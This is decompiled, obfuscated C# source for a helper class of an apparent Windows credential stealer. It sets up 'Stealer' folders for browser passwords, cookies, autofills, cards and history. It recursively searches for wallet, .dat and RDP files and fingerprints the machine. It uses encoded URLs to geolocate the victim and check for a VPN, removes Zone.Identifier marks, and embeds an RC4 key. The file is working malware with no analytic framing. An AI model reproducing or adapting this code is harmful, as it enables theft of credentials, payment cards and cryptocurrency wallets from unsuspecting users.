using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Xml;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000040 RID: 64
	public static class Class_47
	{
		// Token: 0x060000F3 RID: 243 RVA: 0x000089F8 File Offset: 0x00006BF8
		public static object random_string()
		{
			try
			{
				Thread.Sleep(1);
				int num = new Random(DateTime.Now.Millisecond).Next(5, 10);
				char[] array = "abcdefghijklmnopqustuvwxyzABCDEFGHIJKLMNOPQUSTUVWXYZ".ToCharArray();
				byte[] array2 = new byte[1];
				using (RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider())
				{
					rngcryptoServiceProvider.GetNonZeroBytes(array2);
					array2 = new byte[num];
					rngcryptoServiceProvider.GetNonZeroBytes(array2);
				}
				StringBuilder stringBuilder = new StringBuilder(num);
				foreach (byte b in array2)
				{
					stringBuilder.Append(array[(int)b % array.Length]);
				}
				return stringBuilder.ToString();
			}
			catch
			{
			}
			return Path.GetRandomFileName().Replace(".", string.Empty);
		}

		// Token: 0x060000F4 RID: 244
		[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool DeleteFile(string name);

		// Token: 0x060000F5 RID: 245 RVA: 0x00008AF8 File Offset: 0x00006CF8
		public static void Unblock(string fileName)
		{
			Class_47.DeleteFile(fileName + ":Zone.Identifier");
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x00008B0C File Offset: 0x00006D0C
		public static string checc()
		{
			string result = "[VPN]";
			string result2 = "";
			if (Class_46.cmethod_134())
			{
				return result;
			}
			return result2;
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x00008B34 File Offset: 0x00006D34
		public static byte[] RC4(byte[] data)
		{
			byte[] bytes = Encoding.Default.GetBytes("Qgvk!BCGYGZ~62v");
			int[] array = new int[256];
			int[] array2 = new int[256];
			byte[] array3 = new byte[data.Length];
			int i;
			for (i = 0; i < 256; i++)
			{
				array[i] = (int)bytes[i % bytes.Length];
				array2[i] = i;
			}
			int num;
			for (i = (num = 0); i < 256; i++)
			{
				num = (num + array2[i] + array[i]) % 256;
				int num2 = array2[i];
				array2[i] = array2[num];
				array2[num] = num2;
			}
			int num3;
			num = (num3 = (i = 0));
			while (i < data.Length)
			{
				num3++;
				num3 %= 256;
				num += array2[num3];
				num %= 256;
				int num2 = array2[num3];
				array2[num3] = array2[num];
				array2[num] = num2;
				int num4 = array2[(array2[num3] + array2[num]) % 256];
				array3[i] = (byte)((int)data[i] ^ num4);
				i++;
			}
			return array3;
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x00008C50 File Offset: 0x00006E50
		public static string IP()
		{
			string result;
			try
			{
				result = new WebClient().DownloadString(Class_88.gmethod_253("H4sIAAAAAAAEAMsoKSkottLXTyzI1MssyEyr1MsvStcHAPAN4yoWAAAA"));
			}
			catch
			{
				result = "Connection error";
			}
			return result;
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x00008C94 File Offset: 0x00006E94
		public static string CountryCOde()
		{
			string result;
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.LoadXml(new WebClient().DownloadString(Class_47.\u0E47\u0354\u033A\u0317\u0314\u0369\u0368\u0020\u033E\u033C\u0301ส\u0351ส\u0020\u0323dtzaerkapsqfahfw\u0350\u030D\u0308\u0020\u035D\u0020\u0020\u035F\u035C\u030B\u035F\u0308\u0020\u0331\u0339\u034Evkovjnkfvivhdxfk));
				string text;
				if (Class_46.cmethod_134())
				{
					text = "[" + xmlDocument.GetElementsByTagName("countryCode")[0].InnerText + "][VPN]";
				}
				else
				{
					text = "[" + xmlDocument.GetElementsByTagName("countryCode")[0].InnerText + "]";
				}
				result = text;
			}
			catch
			{
				result = "ERR";
			}
			return result;
		}

		// Token: 0x060000FA RID: 250 RVA: 0x00008D44 File Offset: 0x00006F44
		public static string Country()
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(new WebClient().DownloadString(Class_47.\u0E47\u0354\u033A\u0317\u0314\u0369\u0368\u0020\u033E\u033C\u0301ส\u0351ส\u0020\u0323dtzaerkapsqfahfw\u0350\u030D\u0308\u0020\u035D\u0020\u0020\u035F\u035C\u030B\u035F\u0308\u0020\u0331\u0339\u034Evkovjnkfvivhdxfk));
			return "[" + xmlDocument.GetElementsByTagName("country")[0].InnerText + "]";
		}

		// Token: 0x060000FB RID: 251 RVA: 0x00008D94 File Offset: 0x00006F94
		public static string GetHwid()
		{
			string result = "";
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
				managementObject.Get();
				result = managementObject["VolumeSerialNumber"].ToString();
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x060000FC RID: 252 RVA: 0x00008E00 File Offset: 0x00007000
		public static string GetProcessorID()
		{
			string result = "";
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor").Get())
			{
				result = (string)((ManagementObject)managementBaseObject)["ProcessorId"];
			}
			return result;
		}

		// Token: 0x060000FD RID: 253 RVA: 0x00008E74 File Offset: 0x00007074
		public static List<string> GetFilesDoc(string path, string pattern)
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(from s in Class_58.smethod_160(path, pattern, SearchOption.TopDirectoryOnly)
				where Class_84.\u0489\u0E47\u034F\u0020\u0348\u032F\u032B\u0315\u0339\u036F\u0020\u0354\u0331\u030E\u032F\u0020nhxjglgcxywtuowp\u0342\u0317\u0347\u0020i\u0303\u035F\u0306\u0020\u0331\u032F\u032B\u0020\u033C\u0E47\u0020vdtjdpxsqbpulbec.Contains(Path.GetExtension(s).ToLower())
				select s);
				foreach (string path2 in Directory.GetDirectories(path))
				{
					try
					{
						list.AddRange(Class_47.GetFilesDoc(path2, pattern));
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000FE RID: 254 RVA: 0x00008F24 File Offset: 0x00007124
		public static List<string> GetWall(string path, string pattern)
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(from s in Class_58.smethod_160(path, pattern, SearchOption.TopDirectoryOnly)
				where Class_47.\u0339\u0020\u0360\u0020\u0489\u031D\u0353\u0355\u0309\u031B\u0317\u032F\u0349t\u031B\u0E47agscwneidpvfwade\u0E47\u030D\u0339\u0349\u035B\u0310\u035D\u030B\u0368\u0339\u032F\u0020\u0326\u034E\u0E47\u0347vslhdzgbbwcktuah.Contains(Path.GetExtension(s).ToLower())
				select s);
				foreach (string path2 in Directory.GetDirectories(path))
				{
					try
					{
						list.AddRange(Class_47.GetWall(path2, pattern));
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000FF RID: 255 RVA: 0x00008FD4 File Offset: 0x000071D4
		public static long CalculateDirectorySize(DirectoryInfo directory, bool includeSubdirectories)
		{
			long num = 0L;
			foreach (FileInfo fileInfo in directory.GetFiles())
			{
				num += fileInfo.Length;
			}
			if (includeSubdirectories)
			{
				foreach (DirectoryInfo directory2 in directory.GetDirectories())
				{
					num += Class_47.CalculateDirectorySize(directory2, true);
				}
			}
			return num;
		}

		// Token: 0x06000100 RID: 256 RVA: 0x00009044 File Offset: 0x00007244
		public static void DeleteDirectory(string path)
		{
			if (Class_58.tmethod_162(path))
			{
				string[] array = Directory.GetFiles(path);
				for (int i = 0; i < array.Length; i++)
				{
					Class_58.vmethod_165(array[i]);
				}
				array = Directory.GetDirectories(path);
				for (int i = 0; i < array.Length; i++)
				{
					Class_47.DeleteDirectory(array[i]);
				}
				Class_58.cmethod_164(path);
			}
		}

		// Token: 0x06000101 RID: 257 RVA: 0x000090AC File Offset: 0x000072AC
		// Note: this type is marked as 'beforefieldinit'.
		static Class_47()
		{
			string u030A_u0330_u0314_u0E47_u036D_u0020_u0331_u036B_u0310_u0341_u0353_u0333_u035F_u0368_u0333_u0369fscvyixozutspogr_u0316_u0020_u0E47_u0340_u0020_u0325_u035A_u0342_u032F_u0366_u0303_u036D_u0344_u0302_u0338_u032Cmiwjanndutheeold = Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold;
			string str = "\\";
			object obj = Class_47.random_string();
			Class_47.\u035A\u030C\u036Bc\u0326\u0020\u031D\u0331\u035E\u0020\u0020\u030D\u0020\u0368\u034Dtgxjqsczmshvyescj\u0367\u0339\u0309\u0310\u0349\u0309\u035D\u0020\u0020\u0333\u0E47t\u0326\u0355\u033C\u0339qftvsdyuclitenhm = u030A_u0330_u0314_u0E47_u036D_u0020_u0331_u036B_u0310_u0341_u0353_u0333_u035F_u0368_u0333_u0369fscvyixozutspogr_u0316_u0020_u0E47_u0340_u0020_u0325_u035A_u0342_u032F_u0366_u0303_u036D_u0344_u0302_u0338_u032Cmiwjanndutheeold + str + ((obj != null) ? obj.ToString() : null);
			Class_47.\u0337\u0329\u035A\u0341t\u033C\u0020\u034E\u035B\u0322\u0313\u0308\u0320\u0367\u0329\u0359yotlhmdsspprsbmv\u0020\u0315\u0369\u0020\u0363\u034C\u0020\u0308\u035E\u0368\u0020\u030E\u0307\u033C\u0367\u0020jzrebbgywcogvccr = "Stealer";
			Class_47.\u0369ส\u033E\u0020\u035A\u0302\u0317\u0E47\u0340\u0E47\u035A\u0E47\u0E47\u0306\u0343\u0020pgdvbwunpknbmfun\u036B\u0020\u0E47\u0343\u0330\u0308\u0331\u0E47\u0020\u0329\u0342\u0342\u0367\u030B\u0306\u0353vsdojrfcpthshyaq = Class_47.\u0337\u0329\u035A\u0341t\u033C\u0020\u034E\u035B\u0322\u0313\u0308\u0320\u0367\u0329\u0359yotlhmdsspprsbmv\u0020\u0315\u0369\u0020\u0363\u034C\u0020\u0308\u035E\u0368\u0020\u030E\u0307\u033C\u0367\u0020jzrebbgywcogvccr + "\\Browsers";
			Class_47.\u0020\u033F\u0315\u0350\u0352\u0367\u0E47\u0020\u0358\u032F\u0307\u0347\u0324\u033A\u0348\u036Avgwkwyiffpxhvsqg\u0340\u0020\u0358\u0333\u0020\u0351\u035B\u031C\u0020\u0E47\u0E47\u0363\u0020\u0366\u0331\u035Fqalqdbmxtcrpprqk = Class_47.\u0369ส\u033E\u0020\u035A\u0302\u0317\u0E47\u0340\u0E47\u035A\u0E47\u0E47\u0306\u0343\u0020pgdvbwunpknbmfun\u036B\u0020\u0E47\u0343\u0330\u0308\u0331\u0E47\u0020\u0329\u0342\u0342\u0367\u030B\u0306\u0353vsdojrfcpthshyaq + "\\Cookies";
			Class_47.\u035A\u0020\u0359\u0E47\u0366\u0349\u0320\u0348\u034A\u0341\u0339\u034B\u0020\u032F\u0306\u0020zqzxlmywryhyzjxq\u0E47\u0020\u0349\u0315\u0E47\u0324\u0340i\u0303\u033C\u0E47\u0020\u0345\u035C\u034E\u0307aibpggrwzsglawli = Class_47.\u0369ส\u033E\u0020\u035A\u0302\u0317\u0E47\u0340\u0E47\u035A\u0E47\u0E47\u0306\u0343\u0020pgdvbwunpknbmfun\u036B\u0020\u0E47\u0343\u0330\u0308\u0331\u0E47\u0020\u0329\u0342\u0342\u0367\u030B\u0306\u0353vsdojrfcpthshyaq + "\\Passwords";
			Class_47.\u0E47\u0020\u034D\u0020\u0E47\u035B\u0349\u0E47\u0358\u035C\u036B\u0020\u036B\u0364\u031D\u033Emirhvahtmnvwxjwq\u0E47\u0355\u0020\u0335\u0E47\u034E\u0323\u0349\u0340\u0E47\u0307\u030B\u0020\u030B\u0360\u035Bgkliuuhtpiuahszp = Class_47.\u0369ส\u033E\u0020\u035A\u0302\u0317\u0E47\u0340\u0E47\u035A\u0E47\u0E47\u0306\u0343\u0020pgdvbwunpknbmfun\u036B\u0020\u0E47\u0343\u0330\u0308\u0331\u0E47\u0020\u0329\u0342\u0342\u0367\u030B\u0306\u0353vsdojrfcpthshyaq + "\\Autofills";
			Class_47.\u0300\u035A\u0020\u0339\u0334\u0322\u0349\u0489\u0020\u0020\u0020\u0308\u0E47\u0332\u0314\u0020hvxeyxbeqqqeytcp\u033C\u0346\u0309\u0340\u033D\u0307\u0020\u035F\u0020\u032C\u0359\u0329\u0331\u0354\u034E\u0358cpmlnjibutstbbmq = Class_47.\u0369ส\u033E\u0020\u035A\u0302\u0317\u0E47\u0340\u0E47\u035A\u0E47\u0E47\u0306\u0343\u0020pgdvbwunpknbmfun\u036B\u0020\u0E47\u0343\u0330\u0308\u0331\u0E47\u0020\u0329\u0342\u0342\u0367\u030B\u0306\u0353vsdojrfcpthshyaq + "\\Downloads";
			Class_47.\u0310\u0353\u0300\u0339\u0305i\u0489\u0364\u0020\u0359\u0E47\u031A\u0310\u033Ct\u0367wrectesdtcntxetu\u0334\u0362\u0345t\u032A\u0316\u0020\u036B\u0307\u0342\u0020\u0020\u0353\u033F\u032F\u032Fdcenxrkropmfcmbt = Class_47.\u0369ส\u033E\u0020\u035A\u0302\u0317\u0E47\u0340\u0E47\u035A\u0E47\u0E47\u0306\u0343\u0020pgdvbwunpknbmfun\u036B\u0020\u0E47\u0343\u0330\u0308\u0331\u0E47\u0020\u0329\u0342\u0342\u0367\u030B\u0306\u0353vsdojrfcpthshyaq + "\\History";
			Class_47.\u0339\u0020\u0332\u0324\u0349\u0020\u0359\u0020\u0368t\u034E\u0342\u0330\u0331\u0020\u0329apcrmahbbefdsscl\u0349\u0353\u0307\u034F\u0347\u035B\u032C\u0352\u032B\u0331\u0020\u0325\u0330\u0326\u0020\u031Dagehontzszdfjqjv = Class_47.\u0369ส\u033E\u0020\u035A\u0302\u0317\u0E47\u0340\u0E47\u035A\u0E47\u0E47\u0306\u0343\u0020pgdvbwunpknbmfun\u036B\u0020\u0E47\u0343\u0330\u0308\u0331\u0E47\u0020\u0329\u0342\u0342\u0367\u030B\u0306\u0353vsdojrfcpthshyaq + "\\Cards";
			Class_47.\u035F\u0334\u0361\u0342\u0349\u0332\u0317\u033F\u0332\u0304\u0353\u0369\u0331\u0020\u036F\u032Favwbjaawjhovchqj\u035B\u0020\u0308\u0020\u0317\u0339\u0368\u0020\u034E\u0355\u0366\u032F\u0355\u0489\u036C\u0363ukaxxbymjidqsigk = Class_47.\u035A\u030C\u036Bc\u0326\u0020\u031D\u0331\u035E\u0020\u0020\u030D\u0020\u0368\u034Dtgxjqsczmshvyescj\u0367\u0339\u0309\u0310\u0349\u0309\u035D\u0020\u0020\u0333\u0E47t\u0326\u0355\u033C\u0339qftvsdyuclitenhm + "\\Grab";
			Class_47.\u033B\u033C\u0355\u0314\u0330\u0316\u0326\u0327\u0349\u035Ei\u036B\u031D\u0363\u0322\u0367hzhsdavyvmobkojd\u0020\u0309\u033F\u0362\u0020\u0347\u036B\u0366\u0347\u036B\u0356\u0349\u0347\u035C\u0306\u032Djkgcmitutxmwdtwk = DateTime.Now.ToString("MM/dd/yyyy h:mm:ss tt");
			Class_47.\u0367\u0309\u036F\u0320\u0340\u036A\u0332\u0020\u0317\u0020\u032C\u034F\u0020\u0E47\u033D\u0331tsitznjoxugionih\u033E\u035C\u0314\u035D\u0020\u0334\u0353\u0318\u035E\u0315\u035D\u036C\u030C\u0346\u0306\u0316tcqobbemddgicxmi = DateTime.Now.ToString("MM/dd/yyyy");
		}

		// Token: 0x0400009B RID: 155
		public static readonly string \u0316\u032E\u033C\u0E47\u0306\u034A\u0363\u034D\u0308\u0E47\u035B\u0322\u0020\u0020\u035D\u033Fmdzhjsaihzdpzslft\u0E47\u0333\u0317\u0311\u033A\u036B\u032C\u0347\u032C\u0364\u0312\u0020\u0E47\u0020\u0E47mozqkdlfdhqnsnly = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

		// Token: 0x0400009C RID: 156
		public static readonly string \u0349\u0308t\u0324\u0329\u0306\u033Ae\u0340\u0341\u036B\u0351\u0E47c\u0363\u0363xrkhflctjjgrafhq\u036A\u0E47\u0302\u0368\u0020\u032C\u035E\u0349\u0359\u0020\u0020\u0489\u0333\u030C\u0347\u032Cdfodarkersxinukm = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x0400009D RID: 157
		public static readonly string \u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x0400009E RID: 158
		public static readonly string \u032B\u0E47\u0341\u034D\u0357\u0308\u0020\u033D\u030C\u0304\u0020\u032F\u0331\u0362\u0307\u0320ywzuunlvukgjnxfb\u0302\u0333\u0020\u0345\u0020\u0330\u0332\u035F\u0325\u030E\u0324\u0E47\u032E\u033C\u036D\u0020nmyylhulqdujhspx = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

		// Token: 0x0400009F RID: 159
		public static readonly string \u036C\u0329\u032F\u0020\u032F\u0312\u0020i\u036B\u034B\u0358\u033C\u0369\u035E\u035F\u035Adkcrbdpkfpkxmxzn\u0304l\u031D\u0339\u0331\u0366\u0346\u0344\u0348\u0317\u0332\u032E\u0363h\u0020\u0354latwzfwxbtsjdydt = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

		// Token: 0x040000A0 RID: 160
		public static readonly string \u0357\u0326\u032C\u034D\u0E47\u0020\u0332\u031F\u0E47\u0317\u035A\u031C\u0E47\u0329\u0020\u0345fiwgjkytcdevvkdu\u0320\u0332\u0020\u0320\u0349\u0340\u035F\u034D\u0E47\u034D\u0366\u0309\u0366\u0315\u034C\u031Dycedrxvdqukmrguc = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");

		// Token: 0x040000A1 RID: 161
		public static readonly string \u034A\u0367\u0320\u030E\u0E47\u0356\u0E47\u0020\u0E47\u035E\u033A\u0307\u0364\u0325\u033A\u0347wojyhmunazhfiuxb\u0320\u036B\u0347\u035D\u0313\u0332\u036F\u034D\u0331\u031A\u0340\u036A\u0366\u035C\u0364\u0308xbwcnquhcfkvrrhm = Environment.UserName;

		// Token: 0x040000A2 RID: 162
		public static readonly string \u0020\u032C\u0320\u0320\u0020\u0020\u035A\u035C\u0333\u030C\u0020\u0369t\u0363\u0E47สhjbpdmmozxipixxd\u0020\u035C\u0020\u0316\u0348\u0489\u0489\u0332\u0324\u0020\u0020\u0317\u0356\u0359\u035A\u033Cukafaffmbwlfhjuf = Environment.MachineName;

		// Token: 0x040000A3 RID: 163
		public static readonly string \u035C\u034B\u0330\u0342\u0020\u0367\u035B\u035E\u0344\u035A\u033A\u0020t\u036D\u0300\u035Anyexpuugwbwudjdh\u0353t\u0327\u0356\u035C\u033B\u032E\u0E47\u0358\u0020\u0306\u0327\u0300\u035A\u036D\u0369mjllfsrrkysmqbid = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

		// Token: 0x040000A4 RID: 164
		public static string \u0339\u0020\u0360\u0020\u0489\u031D\u0353\u0355\u0309\u031B\u0317\u032F\u0349t\u031B\u0E47agscwneidpvfwade\u0E47\u030D\u0339\u0349\u035B\u0310\u035D\u030B\u0368\u0339\u032F\u0020\u0326\u034E\u0E47\u0347vslhdzgbbwcktuah = "*.wallet,*.dat,*.rdp";

		// Token: 0x040000A5 RID: 165
		public static string \u030C\u0360\u0352\u0330\u0020\u0345\u034D\u031F\u0317\u0020\u036F\u032F\u0335\u0303\u0020\u0348btjzcydnmobecrmu\u0E47\u0E47\u0363\u0E47r\u0367\u0323\u0347\u0331\u0347\u032C\u0348\u0332\u035F\u036B\u034Eplwrzxwpllzxvpwz = Class_47.GetProcessorID() + Class_47.GetHwid();

		// Token: 0x040000A6 RID: 166
		public static string \u0E47\u0354\u033A\u0317\u0314\u0369\u0368\u0020\u033E\u033C\u0301ส\u0351ส\u0020\u0323dtzaerkapsqfahfw\u0350\u030D\u0308\u0020\u035D\u0020\u0020\u035F\u035C\u030B\u035F\u0308\u0020\u0331\u0339\u034Evkovjnkfvivhdxfk = Class_88.gmethod_253("H4sIAAAAAAAEAMsoKSmw0tfPLNBNLMjUS87P1a/IzQEAoQIM4RUAAAA=");

		// Token: 0x040000A7 RID: 167
		public static string \u035A\u030C\u036Bc\u0326\u0020\u031D\u0331\u035E\u0020\u0020\u030D\u0020\u0368\u034Dtgxjqsczmshvyescj\u0367\u0339\u0309\u0310\u0349\u0309\u035D\u0020\u0020\u0333\u0E47t\u0326\u0355\u033C\u0339qftvsdyuclitenhm;

		// Token: 0x040000A8 RID: 168
		public static string \u0337\u0329\u035A\u0341t\u033C\u0020\u034E\u035B\u0322\u0313\u0308\u0320\u0367\u0329\u0359yotlhmdsspprsbmv\u0020\u0315\u0369\u0020\u0363\u034C\u0020\u0308\u035E\u0368\u0020\u030E\u0307\u033C\u0367\u0020jzrebbgywcogvccr;

		// Token: 0x040000A9 RID: 169
		public static string \u0369ส\u033E\u0020\u035A\u0302\u0317\u0E47\u0340\u0E47\u035A\u0E47\u0E47\u0306\u0343\u0020pgdvbwunpknbmfun\u036B\u0020\u0E47\u0343\u0330\u0308\u0331\u0E47\u0020\u0329\u0342\u0342\u0367\u030B\u0306\u0353vsdojrfcpthshyaq;

		// Token: 0x040000AA RID: 170
		public static string \u0020\u033F\u0315\u0350\u0352\u0367\u0E47\u0020\u0358\u032F\u0307\u0347\u0324\u033A\u0348\u036Avgwkwyiffpxhvsqg\u0340\u0020\u0358\u0333\u0020\u0351\u035B\u031C\u0020\u0E47\u0E47\u0363\u0020\u0366\u0331\u035Fqalqdbmxtcrpprqk;

		// Token: 0x040000AB RID: 171
		public static string \u035A\u0020\u0359\u0E47\u0366\u0349\u0320\u0348\u034A\u0341\u0339\u034B\u0020\u032F\u0306\u0020zqzxlmywryhyzjxq\u0E47\u0020\u0349\u0315\u0E47\u0324\u0340i\u0303\u033C\u0E47\u0020\u0345\u035C\u034E\u0307aibpggrwzsglawli;

		// Token: 0x040000AC RID: 172
		public static string \u0E47\u0020\u034D\u0020\u0E47\u035B\u0349\u0E47\u0358\u035C\u036B\u0020\u036B\u0364\u031D\u033Emirhvahtmnvwxjwq\u0E47\u0355\u0020\u0335\u0E47\u034E\u0323\u0349\u0340\u0E47\u0307\u030B\u0020\u030B\u0360\u035Bgkliuuhtpiuahszp;

		// Token: 0x040000AD RID: 173
		public static string \u0300\u035A\u0020\u0339\u0334\u0322\u0349\u0489\u0020\u0020\u0020\u0308\u0E47\u0332\u0314\u0020hvxeyxbeqqqeytcp\u033C\u0346\u0309\u0340\u033D\u0307\u0020\u035F\u0020\u032C\u0359\u0329\u0331\u0354\u034E\u0358cpmlnjibutstbbmq;

		// Token: 0x040000AE RID: 174
		public static string \u0310\u0353\u0300\u0339\u0305i\u0489\u0364\u0020\u0359\u0E47\u031A\u0310\u033Ct\u0367wrectesdtcntxetu\u0334\u0362\u0345t\u032A\u0316\u0020\u036B\u0307\u0342\u0020\u0020\u0353\u033F\u032F\u032Fdcenxrkropmfcmbt;

		// Token: 0x040000AF RID: 175
		public static string \u0339\u0020\u0332\u0324\u0349\u0020\u0359\u0020\u0368t\u034E\u0342\u0330\u0331\u0020\u0329apcrmahbbefdsscl\u0349\u0353\u0307\u034F\u0347\u035B\u032C\u0352\u032B\u0331\u0020\u0325\u0330\u0326\u0020\u031Dagehontzszdfjqjv;

		// Token: 0x040000B0 RID: 176
		public static string \u035F\u0334\u0361\u0342\u0349\u0332\u0317\u033F\u0332\u0304\u0353\u0369\u0331\u0020\u036F\u032Favwbjaawjhovchqj\u035B\u0020\u0308\u0020\u0317\u0339\u0368\u0020\u034E\u0355\u0366\u032F\u0355\u0489\u036C\u0363ukaxxbymjidqsigk;

		// Token: 0x040000B1 RID: 177
		public static string \u033B\u033C\u0355\u0314\u0330\u0316\u0326\u0327\u0349\u035Ei\u036B\u031D\u0363\u0322\u0367hzhsdavyvmobkojd\u0020\u0309\u033F\u0362\u0020\u0347\u036B\u0366\u0347\u036B\u0356\u0349\u0347\u035C\u0306\u032Djkgcmitutxmwdtwk;

		// Token: 0x040000B2 RID: 178
		public static string \u0367\u0309\u036F\u0320\u0340\u036A\u0332\u0020\u0317\u0020\u032C\u034F\u0020\u0E47\u033D\u0331tsitznjoxugionih\u033E\u035C\u0314\u035D\u0020\u0334\u0353\u0318\u035E\u0315\u035D\u036C\u030C\u0346\u0306\u0316tcqobbemddgicxmi;
	}
}
